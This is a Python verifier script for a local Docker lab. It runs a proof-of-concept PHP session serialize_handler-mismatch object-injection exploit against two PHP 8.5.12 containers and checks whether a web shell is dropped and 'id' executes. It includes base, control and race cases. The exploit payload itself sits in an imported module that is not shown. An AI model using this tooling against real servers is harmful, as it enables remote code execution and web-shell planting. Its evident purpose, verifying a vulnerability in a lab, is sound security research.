#!/usr/bin/env python3
"""Verifier for session_handler_mismatch.py: a differential against two patched
PHP 8.5.12 mod_php services that pins the gates -- A base/mismatch via /legacy.php
must yield uid=, B control via /safe.php (no mismatch) must not, C race on stock
cleanup=On is informational. Each case resets session dir + dropped shell first.

Bring up the lab:
    docker compose -f docker-compose.apache-avenues.yml -p p2s-shmismatch --profile shmismatch up -d --build
    python3 -I poc/routes/verify_session_handler_mismatch.py [--only off|on] [--race-tries 60]
"""
from __future__ import annotations

import argparse
import os
import subprocess
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_HERE)  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)
import session_handler_mismatch as shm

OFF = {"url": "http://127.0.0.1:8105", "container": "php2shell-shmismatch-8105",
       "host": "127.0.0.1", "port": 8105}
ON = {"url": "http://127.0.0.1:8106", "container": "php2shell-shmismatch-8106",
      "host": "127.0.0.1", "port": 8106}


from common.labharness import container_up  # noqa: E402


def reset(container: str) -> None:
    subprocess.run(
        ["docker", "exec", container, "sh", "-c",
         "rm -f /var/www/sess/sess_* /var/www/html/p2s_shm_shell.php 2>/dev/null; "
         "chmod 1777 /var/www/sess"],
        check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def log(m: str) -> None:
    print(m, flush=True)


def run_case_base(cfg, reader, expect_rce: bool, label: str) -> bool:
    reset(cfg["container"])
    obj = shm.build_object("DeferredWriter",
                           "/var/www/html/p2s_shm_shell.php", shm.DEFAULT_SHELL)
    hit = shm.run_base(cfg["host"], cfg["port"], "/index.php", reader,
                       "p2s_shm_shell.php", "/var/www/html/p2s_shm_shell.php",
                       obj, "id", None, log)
    got = hit is not None
    ok = (got == expect_rce)
    log(f"  [{label}] rce={got} expect={expect_rce} -> {'PASS' if ok else 'FAIL'}")
    return ok


def run_case_race(cfg, tries: int, label: str) -> bool:
    reset(cfg["container"])
    obj = shm.build_object("DeferredWriter",
                           "/var/www/html/p2s_shm_shell.php", shm.DEFAULT_SHELL)
    hit = shm.run_race(cfg["host"], cfg["port"], "/index.php", "/legacy.php",
                       "p2s_shm_shell.php", "/var/www/html/p2s_shm_shell.php",
                       obj, "id", None, log, max_tries=tries, file_mb=4)
    got = hit is not None
    log(f"  [{label}] rce={got} (timing-dependent; informational) -> "
        f"{'HIT' if got else 'miss'}")
    return got


def main(argv: list[str]) -> int:
    ap = argparse.ArgumentParser(
        description="Verify the session serialize_handler-mismatch primitive on 8.5.12.")
    ap.add_argument("--only", choices=["off", "on"], default=None)
    ap.add_argument("--race-tries", type=int, default=60)
    args = ap.parse_args(argv)

    ran_any = False
    base_pass = control_pass = True
    race_hit = None

    if args.only in (None, "off"):
        if container_up(OFF["container"]):
            ran_any = True
            log(f"\n######## 8.5.12 cleanup=Off  {OFF['url']} ########")
            log("-- A: base variant via /legacy.php (mismatch) -- expect RCE")
            base_pass = run_case_base(OFF, "/legacy.php", True, "base/mismatch")
            log("-- B: control via /safe.php (no mismatch) -- expect NO RCE")
            control_pass = run_case_base(OFF, "/safe.php", False, "control/no-mismatch")
        else:
            log(f"[skip] {OFF['container']} not running "
                "(docker compose -f docker-compose.apache-avenues.yml "
                "-p p2s-shmismatch --profile shmismatch up -d --build)")

    if args.only in (None, "on"):
        if container_up(ON["container"]):
            ran_any = True
            log(f"\n######## 8.5.12 cleanup=On (STOCK)  {ON['url']} ########")
            log("-- C: race variant via /legacy.php -- stock cleanup proof")
            race_hit = run_case_race(ON, args.race_tries, "race/stock")
        else:
            log(f"[skip] {ON['container']} not running "
                "(docker compose -f docker-compose.apache-avenues.yml "
                "-p p2s-shmismatch --profile shmismatch up -d --build)")

    log("\n==== serialize_handler-mismatch verdict ====")
    if not ran_any:
        log("  no labs ran -- bring up docker-compose.apache-avenues.yml "
            "--profile shmismatch first.")
        return 2
    core_ok = base_pass and control_pass
    log(f"  base(mismatch) RCE on patched 8.5.12 : {'PASS' if base_pass else 'FAIL'}")
    log(f"  control(no-mismatch) gate            : {'PASS' if control_pass else 'FAIL'}")
    if race_hit is not None:
        log(f"  race(stock cleanup=On) RCE           : {'HIT' if race_hit else 'miss (retry)'}")
    log("  NOTE: app-level object injection; requires serialize_handler mismatch "
        "+ a destructor gadget. NOT a PHP-core RCE.")
    if core_ok:
        log("  => PASS -- conditional RCE confirmed on fully-patched 8.5.12, "
            "gate verified.")
        return 0
    log("  => FAIL -- see above.")
    return 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
